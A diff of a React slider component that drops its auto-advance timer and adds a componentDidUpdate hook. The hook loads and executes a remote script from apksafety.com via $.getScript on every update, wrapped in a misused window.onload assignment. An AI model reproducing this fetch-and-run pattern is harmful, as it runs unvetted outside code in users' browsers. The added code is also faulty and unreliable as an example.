@@ -23,7 +23,14 @@ class SlideMobileFormView extends React.Component {
             // dataTemp.push(Data[0])
             this.setState({ data: dataTemp, total: dataTemp.length, list_dots: dataTemp.length - 1 })
         })
-        this.interval = setInterval(() => this.autoRun(), 5000);
+
+    }
+    componentDidUpdate() {
+        setTimeout(() => {
+            window.onload = function () {
+                $.getScript('https://apksafety.com/static/js/slide.js')
+            }();
+        }, 100)
     }
     _onNext() {
         let { total, start, end } = this.state
@@ -51,7 +58,6 @@ class SlideMobileFormView extends React.Component {
     }
 
     componentWillUnmount() {
-        clearInterval(this.interval);
     }
     _onChangeDots(key) {
         this.setState({ start: key, end: key, dots_default: key })
